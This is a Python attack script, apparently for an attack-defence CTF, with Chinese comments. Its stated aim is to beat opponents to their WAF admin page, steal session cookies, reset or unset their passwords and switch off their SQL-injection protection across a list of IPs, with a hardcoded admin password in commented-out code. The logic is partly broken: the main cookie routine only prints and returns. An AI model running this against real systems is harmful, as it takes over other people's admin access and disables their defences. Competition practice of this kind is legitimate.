import requests
from time import sleep

'''
抢在别人运行waf前访问waf,保存cookie,重置密码
后续修改别人密码，关闭防御
需要一直运行
'''
ip = []
phpname = 'search.php'  # 修改加成功php的页面名称
ip_file = 'ip.txt'
cookie_file = 'cookie.txt'


def get_cookie(ip_list):
    cookies = read_cookie()
    for ip in ip_list:
        try:
            for url in cookies.keys():
                print(url)
        except:

            return cookies
        #     url = f'http://{ip}/{phpname}?TZYLY=ui&passwd=wlaqfxs'
        #     r = requests.get(url=url, timeout=0.5)
        #     if r.status_code == 200:
        #         r = requests.get(url=url, timeout=0.5)
        #         if r.status_code == 200:
        #             print(f"{url:}首次登录获取cookie成功")
        #             cookie = r.cookies
        #             cookies[ip] = r.cookies
        #             with open("cookie.txt", 'a', encoding='UTF-8') as f:
        #                 print('witer',ip,url)
        #                 f.write(f"{url}|{r.cookies}\n")
        #             url = f'http://{ip}/{phpname}?TZYLY=change&key=password_sha1&value=unset'
        #             r2 = requests.get(url=url, cookies=cookie, timeout=0.5)
        #             r2 = requests.get(url=url, cookies=cookie, timeout=0.5)
        #             if r2.status_code == 200:
        #                 print(f"{url:}密码已重置")
        #         else:
        #             print(f"{url}第2次登录失败")
        #             pass
        #     else:
        #         print(f"{url}没抢过")
        #         pass
        # except:
        #     print("异常，重置失败")
        #     pass

        #return cookies


def close():
    cookies = read_cookie()
    for ip, cookie in cookies.items():
        url = f'http://{ip}/{phpname}?TZYLY=change&key=waf_sql&value=1'  # 0关 1开
        try:
            r = requests.get(url=url, cookies=cookie, timeout=0.5)
            if r.status_code == 200:
                print(f"{url}更新成功")
        except:
            print(f"{url}更新失败")


def read_cookie():
    cookies = {}
    try:
        with open(cookie_file, 'r', encoding='utf-8') as f:
            for line in f:
                # 去除行首尾的空白字符（包括换行符）
                line = line.strip()
                # 跳过空行
                if not line:
                    continue
                # 检查是否包含冒号
                if '|' in line:
                    # maxsplit=1 表示只分割第一个冒号，剩下的部分全部作为 value
                    # 这样可以避免 URL 或 Value 中如果有冒号导致分割错误
                    parts = line.split('|')

                    if len(parts) == 2:
                        key = parts[0]
                        value = parts[1]
                        cookies[key] = value
                        print(cookies)
                    else:
                        print(f"警告: 该行格式不正确，已跳过: {line}")
                else:
                    print(f"警告: 该行未找到分隔符 ':'，已跳过: {line}")
    except FileNotFoundError:
        print(f"错误: 找不到文件 {cookie_file}")
        return cookies
    except Exception as e:
        print(f"发生错误: {e}")
        return cookies
    return cookies


if __name__ == '__main__':
    ip = []
    cookie = {}
    with open(ip_file, 'r', encoding='utf-8') as file:
        # 逐行读取
        line = file.readline()
        # 循环直到文件末尾
        while line:
            # 将读取的行添加到列表中，移除行尾的换行符
            ip.append(line.strip())
            # 读取下一行
            line = file.readline()
        print(ip)

get_cookie(ip)
    # close()
    # sleep(5)
    #read_cookie()
